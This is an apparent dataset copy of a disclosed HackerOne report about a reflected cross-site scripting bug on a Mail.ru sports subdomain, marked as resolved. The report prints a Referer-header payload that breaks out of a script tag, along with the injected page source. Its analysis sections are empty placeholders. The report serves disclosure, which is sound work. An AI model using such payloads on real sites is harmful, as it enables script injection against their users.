---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '51140'
original_report_id: '51140'
title: XSS in touch.sports.mail.ru
weakness: Cross-site Scripting (XSS) - Generic
team_handle: mailru
created_at: '2015-03-12T15:16:37.291Z'
disclosed_at: '2015-05-21T01:20:31.025Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# XSS in touch.sports.mail.ru

## Metadata

- HackerOne Report ID: 51140
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: mailru
- Disclosed At: 2015-05-21T01:20:31.025Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

The XSS vulnerability is located here:

```
https://touch.sports.mail.ru
```

and is triggered by setting referer to:

```
ttttt</script><script>alert(0)</script><script>
```

The problem is that the referer is being loaded like so:

```html
<script>
     [Other Javascript Here]	
    "httpReferer":"ttttt
</script>
<script>
    alert(0)
</script>
<script>
    ","user":"","topBanner":{"sz":9,"slot":3333},"retinaBanner":" <div class=\"ad\">\r\n<img src=\"https:\/\/rs.mail.ru\/a12327061.gif?sz=9\&amp;rnd=931100856\&ts=1426172695\&sz=9\" style=\"width:0;height:0;position:absolute;\" alt=\"\"\/>\n<!--zg-->\r\n<\/div>"}
</script>
```

where the relevant part is:

``` html
<script>
    alert(0)
</script>
```

I am aware that this is out of scope, but I am still reporting it since I just happened to spot it while looking for other bugs.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
